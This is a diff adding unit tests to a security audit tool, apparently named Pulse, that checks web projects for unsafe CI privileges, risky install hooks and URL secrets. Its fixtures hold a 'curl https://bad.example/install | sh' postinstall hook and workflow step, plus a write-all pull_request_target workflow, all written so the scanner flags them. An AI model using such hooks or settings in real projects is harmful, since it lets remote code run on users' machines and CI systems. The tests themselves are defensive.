@@ -74,6 +74,26 @@ describe("Pulse audit controls", () => {
   });
 });
 
+describe("delivery and abuse safeguards", () => {
+  it("finds unsafe CI privileges, mutable inputs, remote shell bootstrap, and risky install hooks", () => {
+    const checks = evaluateWebSourceChecks(snapshot({
+      "package.json": JSON.stringify({ scripts: { postinstall: "curl https://bad.example/install | sh" } }),
+      ".github/workflows/review.yml": `on: pull_request_target\npermissions: write-all\nsteps:\n - uses: acme/action@v2\n - image: acme/build:latest\n - run: curl https://bad.example/install | sh`,
+    }));
+    for (const key of ["pulse_ci_untrusted_privilege", "pulse_ci_remote_shell", "pulse_install_lifecycle_risk"]) expect(statusOf(checks, key)).toBe("FAIL");
+    for (const key of ["pulse_ci_immutable_actions", "pulse_ci_immutable_images"]) expect(statusOf(checks, key)).toBe("WARN");
+  });
+
+  it("tests URL secrets and server input limits", () => {
+    const checks = evaluateWebSourceChecks(snapshot({
+      "src/server.ts": `const app = express(); app.use(express.json({ limit: "1mb" })); app.post("/upload", upload.single("file")); const x = "https://api.example/x?api_key=secret"; const limits = { fileSize: 1000 };`,
+    }));
+    expect(statusOf(checks, "pulse_url_secret")).toBe("FAIL");
+    expect(statusOf(checks, "pulse_request_body_limit")).toBe("PASS");
+    expect(statusOf(checks, "pulse_upload_limit")).toBe("PASS");
+  });
+});
+
 describe("injection — presence findings", () => {
   it("fails raw HTML rendering with no sanitiser present", () => {
     const checks = evaluateWebSourceChecks(snapshot({
